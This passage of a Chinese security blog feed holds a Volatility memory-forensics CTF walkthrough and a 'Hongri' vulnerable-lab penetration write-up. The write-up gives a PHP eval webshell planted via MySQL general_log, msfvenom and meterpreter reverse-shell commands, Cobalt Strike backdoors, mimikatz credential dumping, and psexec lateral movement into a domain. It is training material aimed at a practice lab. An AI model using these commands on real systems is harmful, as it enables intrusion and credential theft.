connections</code></pre><p>connections：查看网络连接<br>查看命令行操作，显示cmd历史命令 cmdscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</code></pre><p>cmdscan：可用于查看终端记录<br>查看进程命令行参数（具体一些可疑进程的参数指令) cmdline</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdline</code></pre><p>扫描所有的文件列表 filescan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 filescan</code></pre><p>（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）</p><p>例</p><pre><code>   volatility -f 1.vmem --profile=Win7SP1x64 filescan grep &quot;flag.txt&quot;</code></pre><p>cat system.txt | grep -i computername<br>查看文件内容 dumpfiles</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</code></pre><p>需要指定偏移量 -Q 和输出目录 -D</p><p>dumpfiles：导出某一文件(指定虚拟地址)<br>查看当前展示的notepad内容  notepad</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 notepad</code></pre><p>查看当前展示的 notepad 文本（–profile&#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）<br>显示有关编辑控件（曾经编辑过的内容）的信息 editbox</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 editbox</code></pre><p>editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容<br>提取进程 memdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</code></pre><p>memdump：提取出指定进程，常用foremost 来分离里面的文件  </p><p>需要指定进程-p [pid] 和输出目录 -D </p><p>memdump -p 332 -D XX&#x2F;   </p><p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p><p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p><p>strings -e l 2040.dmp | grep flag 查找flag</p><p>屏幕截图 screenshot</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</code></pre><p>screenshot：保存基于GDI窗口的伪截屏<br>查看注册表配置单元 hivelist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivelist</code></pre><p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址<br>查看注册表键名 hivedump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</code></pre><p>查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等 userassist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 userassist</code></pre><p>最大程序提取信息timeliner</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 timeliner</code></pre><p>timeliner: 将所有操作系统事件以时间线的方式展开<br>查看剪贴板信息 clipboard</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 clipboard</code></pre><p>clipboard：查看剪贴板信息<br>恢复被删除的文件 mftparser</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 mftparser</code></pre><p>mftparser：恢复被删除的文件<br>查看环境变量 envars</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 envars</code></pre><p>envars：查看环境变量<br>列出某一进程加载的所有dll文件 dlllist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</code></pre><p>dlllist: 列出某一进程加载的所有dll文件<br>程序版本信息 verinfo</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 verinfo</code></pre><p>列出PE｜程序版本信息<br>产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</code></pre><p>在进程中PPID比PID还大，那就可能这个进程有异常程序<br>从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</code></pre><h1 id="七-例题讲解"><a href="#七-例题讲解" class="headerlink" title="七.例题讲解"></a>七.例题讲解</h1><p>[陇剑杯 2021]内存分析</p><p>1.网管小王制作了一个虚拟机文件，让您来分析后作答：虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）。</p><p>1)首先确定镜像是何种操作系统的，命令imageinfo即可获取镜像信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192418198.png" alt="image-20230718192418198"></p><p>2)我们使用hashdump获取sam</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192741658.png" alt="image-20230718192741658"></p><p>3)john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192801504.png" alt="image-20230718192801504"></p><p>我们可以看到flag</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）</p><p>1)我们直接在桌面进行搜索，我们可以看到HUAWEI手机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193125512.png" alt="image-20230718193125512"></p><p>2)我们直接搜索HUAWEI</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193510157.png" alt="image-20230718193510157"></p><p>3)将第一个提取出来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193728215.png" alt="image-20230718193728215"></p><p>4)我们可以看到2个文件，我们进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193757715.png" alt="image-20230718193757715"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194316509.png" alt="image-20230718194316509"></p><p>5)解压完成后发现多了一个HUAWEI P40_2021-aa-bb xx.yy.zz文件夹，并且在里面发现一个images0.tar.enc文件，此文件为华为加密文件，我们需要在网上下载解密脚本，解压密码题目中已经提示为上一题的flag,也就是W31C0M3 T0 THiS 34SY F0R3NSiCX，注意，运行脚本时密码的空格要改为’_’也就是W31C0M3_T0_THiS_34SY_F0R3NSiCX</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194455738.png" alt="image-20230718194455738"></p><p>6)项目地址</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>RealityNet<span class="token operator">/</span>kobackupdec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：kobackupdec<span class="token operator">.</span>py <span class="token punctuation">[</span><span class="token operator">-</span>h<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> password backup_path dest_pathpassword：是用户提供的密码backup_path：是包含华为备份的文件夹，可以使用相对或绝对路径dest_path：是要在指定路径（绝对或相对）中创建的文件夹。如果提供的文件夹已存在，它将报错例如：python kobackupdec<span class="token operator">.</span>py <span class="token operator">-</span>vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="token string double-quoted-string">"/home/kali/volatility_2.6_lin64_standalone/HUAWEI P40_2021-aa-bb xx.yy.zz/picture/storage/MediaTar/images/"</span> <span class="token operator">/</span>home<span class="token operator">/</span>kali<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于我的环境有问题，所以后面我使用网上的图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201203971.png" alt="image-20230718201203971"></p><p>7)运行完后会有两个文件，打开storage</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201230377.png" alt="image-20230718201230377"></p><p>8)里面会有一个.tar压缩文件，打开后会有flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/2a86bea6dbfd4e91a3559abcc1b9b39a.png" alt="img"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;TH4NK Y0U <span class="token keyword">FOR</span> DECRYPTING MY <span class="token keyword">DATA</span>&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场(一)</title>
      <link href="/2023/07/17/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%B8%80/"/>
      <url>/2023/07/17/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h1><ol><li>实验环境拓扑如下：</li></ol><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201224481.png" alt="image-20230717201224481"></p><ol start="2"><li>下载好镜像文件，下载地址: <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a> (13G，需要百度网盘会员)</li></ol><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201236420.png" alt="image-20230717201236420"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201255042.png" alt="image-20230717201255042"></p><p>3.需要模拟内网和外网两个网段， Win7 虚拟机相当于网关服务器，所以需要两张网卡，一个用来向外网提供web服务，一个是通向内网。添加网络设配器如下图</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201301398.png" alt="image-20230717201301398"></p><p>将 Win7 的网络适配器 1 设置成 VMnet1 仅主机模式（内网），网络适配器 2 设置成 NAT 模式（外网）</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201316726.png" alt="image-20230717201316726"></p><p>而 Win2003、Win2008 网络适配器设置成VMnet1仅主机模式(内网)。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201728089.png" alt="image-20230717201728089"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201735459.png" alt="image-20230717201735459"></p><p>网络配置完成，这三台虚拟主机默认开机密码都是 hongrisec@2019（开机提示密码已过期，更改为 123qwe.即可）登录查看三台虚拟机的ip地址如下：</p><p>windows7：(内：192.168.52.143 &#x2F; 外：192.168.44.134(外网根据你的物理机进行分配))</p><p>windows2003：(内：192.168.52.141)</p><p>windows2008:（内：192.168.52.138）</p><p>开机之后更新一下Vmware TOOls</p><p>更新之前</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201741877.png" alt="image-20230717201741877"></p><p>更新之后</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201745978.png" alt="image-20230717201745978"></p><p>最后在 Win7 外网服务器主机的 C 盘找到 PhpStudy 启动 Web 服务</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201750739.png" alt="image-20230717201750739"></p><p>靶场的环境搭建完毕</p><h1 id="二．Web渗透"><a href="#二．Web渗透" class="headerlink" title="二．Web渗透"></a>二．Web渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>(1)我们使用nmap进行扫描 nmap -T4 -A 192.168.44.134(nmap的使用-A:全面扫描 -T4: 快速扫描)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201756235.png" alt="image-20230717201756235"></p><p>扫描工具很多，能不能扫出有用信息还是看字典是否强大，可以看到目标80端口开启，3306端口开放</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201801786.png" alt="image-20230717201801786"></p><p>(2)我们访问<a href="http://192.168.44.134/phpmyadmin%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0">http://192.168.44.134/phpmyadmin，可以看到数据库管理后台</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201805263.png" alt="image-20230717201805263"></p><p>我们猜测用户名和密码是root root，可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201810373.png" alt="image-20230717201810373"></p><p>(3)我们尝试into outfile写入木马进行getshell，想在网站内部写入木马，需要知道网站的绝对路径，可以通过报错获取路径，用select @@basedir;查询，通过查询phpinfo.php等等多种方法，这里我们使用select @@basedir;进行查询。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201815220.png" alt="image-20230717201815220"></p><p>(4)然后通过执行select ‘<? php eval($_POST[pass]);?>’into outfile ‘C:&#x2F;phpStudy&#x2F;www&#x2F;webshell.php’;(注意这里的符号都是英文状态，不然会报错)将木马写入到网站的根目录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201821490.png" alt="image-20230717201821490"></p><p>我们可以看到写入失败，通过查询得知这里不能使用into outfile的方式写入shell，可以通过执行“show variables like ‘%secure_file%’;”查询下是否能直接写入shell。这里secure_file_priv的值为NULL，说明不能使用into outfile的方式写入shell。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201826755.png" alt="image-20230717201826755"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201832598.png" alt="image-20230717201832598"></p><p>(5) 尝试日志写入shell</p><p>查看日志状态：show variables like ‘%general%’,我们可以看到是关闭的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201929098.png" alt="image-20230717201929098"></p><p>这里我们说一下general_log和general_log_file：</p><p>mysql打开general_log开关之后，所有对数据库的操作都将记录在general_log_file指定的文件目录中，以原始的状态来显示，如果将general_log开关打开，general_log_file指定一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，可以通过访问general_log_file指定的文件来获取webshell。</p><p>开启日志记录：set global general_log &#x3D; “ON”;再查询日志状态，是开启的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201937649.png" alt="image-20230717201937649"></p><p>(6)执行命令：set global general_log_file&#x3D;‘C:&#x2F;phpStudy&#x2F;www&#x2F;web.php’，指定日志写入到网站根目录的 web.php 文件.</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201942056.png" alt="image-20230717201942056"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201945590.png" alt="image-20230717201945590"></p><p>访问日志文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201950976.png" alt="image-20230717201950976"></p><p>(7)我们连接蚁剑(使用蚁剑的时候，记得关闭杀毒软件)，密码是pass，我们可以看到连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201954632.png" alt="image-20230717201954632"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201959556.png" alt="image-20230717201959556"></p><h2 id="2-WEB后台上传GetShell"><a href="#2-WEB后台上传GetShell" class="headerlink" title="2.WEB后台上传GetShell"></a>2.WEB后台上传GetShell</h2><p>(1)在我们目录扫描中，还扫到了我们的网站备份源码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202003194.png" alt="image-20230717202003194"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202007242.png" alt="image-20230717202007242"></p><p>(2) 我们搭建yxcms 系统，浏览器访问<a href="http://192.168.44.134/yxcms/">http://192.168.44.134/yxcms/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202035991.png" alt="image-20230717202035991"></p><p>我们根据提示成功进入网站后台</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202041997.png" alt="image-20230717202041997"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202047557.png" alt="image-20230717202047557"></p><p>(3) 可以新建一个木马文件，前台模块-管理模块文档-新建</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202052813.png" alt="image-20230717202052813"></p><p>我们可以看到文件已上传，可通过前面下载的beifen.rar文件来查找acomment.php文件来确定文件上传的路径：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202149936.png" alt="image-20230717202149936"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202155848.png" alt="image-20230717202155848"></p><p>(4) 蚁剑成功连接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202200316.png" alt="image-20230717202200316"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202205043.png" alt="image-20230717202205043"></p><p>(5) 留言板处存在xss漏洞：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202209323.png" alt="image-20230717202209323"></p><p> <img src="/./../imgs/$%7Bfiilename%7D/image-20230717202215123.png" alt="image-20230717202215123"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202219228.png" alt="image-20230717202219228"></p><h1 id="三-内网信息收集"><a href="#三-内网信息收集" class="headerlink" title="三. 内网信息收集"></a>三. 内网信息收集</h1><h2 id="1-使用CS植入Backdoor"><a href="#1-使用CS植入Backdoor" class="headerlink" title="1.使用CS植入Backdoor"></a>1.使用CS植入Backdoor</h2><p>(1)我们在kali或者Windows里面安装CS,我们在kali里面启动CS，我们需要开2个终端</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202223970.png" alt="image-20230717202223970"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202230105.png" alt="image-20230717202230105"></p><p>(2) 先新建监听，主机IP填写kali的ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202244663.png" alt="image-20230717202244663"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202253586.png" alt="image-20230717202253586"></p><p>(3)我们生成后门</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202258456.png" alt="image-20230717202258456"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202302900.png" alt="image-20230717202302900"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202324680.png" alt="image-20230717202324680"></p><p>(4)生成后，使用蚁剑进行上传到靶机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202329458.png" alt="image-20230717202329458"></p><p>(5) 上传后使用蚁剑中使用终端命令行执行start web.exe, 可以看到我们 CS 客户端靶机上线</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202333618.png" alt="image-20230717202333618"></p><p>(6) 我们进行提权到 SYSTEM 系统权限账户。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202337578.png" alt="image-20230717202337578"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202341534.png" alt="image-20230717202341534"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202345357.png" alt="image-20230717202345357"></p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p>(1) 由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202352939.png" alt="image-20230717202352939"></p><p>(2) 开始简单进行信息收集，常用到的有以下</p><ol><li>ipconfig &#x2F;all  查看本机ip，所在域</li><li>route print   打印路由信息</li><li>net view    查看局域网内其他主机名</li><li>arp -a     查看arp缓存</li><li>whoami</li><li>net start    查看开启了哪些服务</li><li>net share    查看开启了哪些共享</li><li>net share ipc$ 开启ipc共享</li><li>net share c$  开启c盘共享</li><li>net use \192.168.xx.xx\ipc$ “” &#x2F;user:””  与192.168.xx.xx建立空连接</li><li>net use \192.168.xx.xx\c$ “密码” &#x2F;user:”用户名” 建立c盘共享</li><li>dir \192.168.xx.xx\c$\user  查看192.168.xx.xx c盘user目录下的文件</li><li>net config Workstation  查看计算机名、全名、用户名、系统版本、工作站、域、登录域</li><li>net user         查看本机用户列表</li><li>net user &#x2F;domain     查看域用户</li><li>net localgroup administrators  查看本地管理员组（通常会有域用户）</li><li>net view &#x2F;domain     查看有几个域</li><li>net user 用户名 &#x2F;domain  获取指定域用户的信息</li><li>net group &#x2F;domain    查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</li><li>net group 组名 &#x2F;domain  查看域中某工作组</li><li>net group “domain admins” &#x2F;domain 查看域管理员的名字</li><li>net group “domain computers” &#x2F;domain 查看域中的其他主机名</li><li>net group “doamin controllers” &#x2F;domain 查看域控制器（可能有多台）</li></ol><p>(3) 使用ipconfig &#x2F;all 判断是否存在域, 可以看到存在gob.org域</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202358348.png" alt="image-20230717202358348"></p><p>也可以执行命令net config Workstation 来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202401729.png" alt="image-20230717202401729"></p><p>(4) 获取域内用户的详细信息：wmic useraccount get &#x2F;all</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202406745.png" alt="image-20230717202406745"></p><p>(5) 查看是否存在杀毒进程：tasklist</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202413344.png" alt="image-20230717202413344"></p><p>除了使用CS外，我们也可以使用msf进入操作。</p><h2 id="3-msf"><a href="#3-msf" class="headerlink" title="3.msf"></a>3.msf</h2><p>(1)使用msf生成shell.exe</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202417411.png" alt="image-20230717202417411"></p><p>(2) 将shell.exe使用蚁剑上传到web服务器中。msf开启监听</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202424375.png" alt="image-20230717202424375"></p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 192.168.44.130</p><p>set lport 6666</p><p>exploit</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202429791.png" alt="image-20230717202429791"></p><p>我们可以看到没有反弹成功，我们换一个端口4444</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202433299.png" alt="image-20230717202433299"></p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.44.130 LPORT&#x3D;4444 -f exe -o door.exe</p><p>(3) 运行door.exe，msf成功反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202438821.png" alt="image-20230717202438821"></p><p>(4) msf中getsystem也可直接提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202445259.png" alt="image-20230717202445259"></p><p>（5）MSF使用_MSF中kiwi(mimikatz)模块的使用</p><p>1) 首先:提权到system权限：</p><p>一是当前的权限是administrator用户；</p><p>二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。 </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202454259.png" alt="image-20230717202454259"></p><p>2)进程迁移</p><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。</p><p>所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>查看进程信息:ps</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202458887.png" alt="image-20230717202458887"></p><p>把进程迁移到PID为504这个程序中(因为当前用户)：</p><p>注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202504681.png" alt="image-20230717202504681"></p><ol><li>load kiwi #加载kiwi模块</li><li>help kiwi #查看kiwi模块的使用</li><li>creds_all：       #列举所有凭据</li><li>creds_kerberos：    #列举所有kerberos凭据</li><li>creds_msv：       #列举所有msv凭据</li><li>creds_ssp：       #列举所有ssp凭据</li><li>creds_tspkg：      #列举所有tspkg凭据</li><li>creds_wdigest：     #列举所有wdigest凭据</li><li>dcsync：        #通过DCSync检索用户帐户信息</li><li>dcsync_ntlm：      #通过DCSync检索用户帐户NTLM散列、SID和RID</li><li>golden_ticket_create： #创建黄金票据</li><li>kerberos_ticket_list： #列举kerberos票据</li><li>kerberos_ticket_purge： #清除kerberos票据</li><li>kerberos_ticket_use：  #使用kerberos票据</li><li>kiwi_cmd：       #执行mimikatz的命令，后面接mimikatz.exe的命令</li><li>lsa_dump_sam：     #dump出lsa的SAM</li><li>lsa_dump_secrets：   #dump出lsa的密文</li><li>password_change：    #修改密码</li><li>wifi_list：       #列出当前用户的wifi配置文件</li><li>wifi_list_shared：   #列出共享wifi配置文件&#x2F;编码</li></ol><p>3)该命令可以列举系统中的明文密码: creds_all #列举所有凭据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202510733.png" alt="image-20230717202510733"></p><h1 id="四-内网横向渗透"><a href="#四-内网横向渗透" class="headerlink" title="四. 内网横向渗透"></a>四. 内网横向渗透</h1><p> 利用MSF横向渗透可以使用cs和MSF两种方式进行横向渗透。这里以CS作为演示。(2008,2003可以使用永恒之蓝进行)</p><h2 id="1-第一步就是生成exe，然后拿到shell-上面已经讲过"><a href="#1-第一步就是生成exe，然后拿到shell-上面已经讲过" class="headerlink" title="1.第一步就是生成exe，然后拿到shell(上面已经讲过)"></a>1.第一步就是生成exe，然后拿到shell(上面已经讲过)</h2><h2 id="2-进行目标主机信息收集"><a href="#2-进行目标主机信息收集" class="headerlink" title="2.进行目标主机信息收集"></a>2.进行目标主机信息收集</h2><h2 id="3-横向探测"><a href="#3-横向探测" class="headerlink" title="3.横向探测"></a>3.横向探测</h2><p>(1)获取到一个 cs 的 beacon 后可以目标内网情况和端口开放情况</p><p>在 beacon 上右键 -&gt; 目标 -&gt; 选择 net view 或者 port scan</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202515512.png" alt="image-20230717202515512"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202520013.png" alt="image-20230717202520013"></p><p>(2). 执行后可以在 Targets 选项卡看到扫描出来的主机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202528330.png" alt="image-20230717202528330"></p><p>(3). 用 cs 的 hashdump 读内存密码：hashdump，用 mimikatz 读注册表密码：logonpasswords</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202534737.png" alt="image-20230717202534737"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202542242.png" alt="image-20230717202542242"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202547109.png" alt="image-20230717202547109"></p><h2 id="4-横向移动"><a href="#4-横向移动" class="headerlink" title="4.横向移动"></a>4.横向移动</h2><p>这里有很多种方式，可以：</p><p>1.)cs 上开通 socks 通道，在攻击机上用 proxychains 将攻击机的 msf 代入内网，但是 cs 的 socks 代理不稳定</p><p>2.)ew 添加转接隧道，在攻击机上用 proxychains 将攻击机的 msf 代入内网</p><p>3.)cs 派生到 msf，msf 使用 socks4a 代理进内网，但是并不稳定</p><p>4.)cs 派生到 msf，msf 使用使用 autoroute 添加路由进内网</p><p>5.)用 frp 创建 socks5 代理</p><h2 id="5-SMB-Beacon"><a href="#5-SMB-Beacon" class="headerlink" title="5.SMB Beacon"></a>5.SMB Beacon</h2><p>另外这里还要介绍下 cs 派生 SMB Beacon</p><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</p><p>简单来说，SMB Beacon 有两种方式</p><p>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</p><p>1)新建一个 Listener，payload 设置为 Beacon SMB：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202552846.png" alt="image-20230717202552846"></p><p>2)选择后会反弹一个子会话，在 external 的 ip 后面会有一个链接的小图标：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202557088.png" alt="image-20230717202557088"></p><p>这就是派生的 SMB Beacon，当前没有连接</p><p>可以在主 Beacon 上用 link host 连接它，或者 unlink host 断开它</p><p>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h2 id="6-psexec使用凭证登录其他主机"><a href="#6-psexec使用凭证登录其他主机" class="headerlink" title="6.psexec使用凭证登录其他主机"></a>6.psexec使用凭证登录其他主机</h2><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p><p>于是可以尝试使用 psexec 模块登录其他主机</p><p>1)右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202604062.png" alt="image-20230717202604062"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202608269.png" alt="image-20230717202608269"></p><p>2)执行效果如下:</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202611941.png" alt="image-20230717202611941"></p><p>3)这几条命令，执行后得到了 ROOT-TVI862UBEH 这台主机的 beacon</p><p>如法炮制得到了域控主机 OWA 的 beacon:</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202615966.png" alt="image-20230717202615966"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机-红日 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之SQL注入</title>
      <link href="/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      
